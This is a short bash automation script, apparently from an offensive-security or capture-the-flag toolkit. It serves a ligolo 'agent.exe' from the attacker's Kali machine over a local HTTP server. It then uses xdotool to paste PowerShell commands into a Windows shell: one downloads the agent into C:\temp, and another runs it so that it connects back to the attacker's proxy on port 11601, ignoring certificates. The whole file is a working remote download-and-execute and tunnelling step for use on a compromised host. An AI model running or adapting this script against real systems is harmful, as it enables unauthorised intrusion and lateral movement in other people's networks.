#!/bin/bash

: '
ps download ligolo agent.exe to server and connect to proxy
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd ~/Desktop/base/code/xdotool/scripts/portListening/.files
python3 -m http.server 1337 &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

paste_command 'New-Item -Path "c:\" -Name "temp" -ItemType "directory"'
xdotool key Return
sleep 0.8

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/agent.exe', '${TMP_FOLDER}\agent.exe')"
xdotool key Return 
sleep 3

paste_command "${TMP_FOLDER}\agent.exe -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
sleep 10

kill $HTTP_PID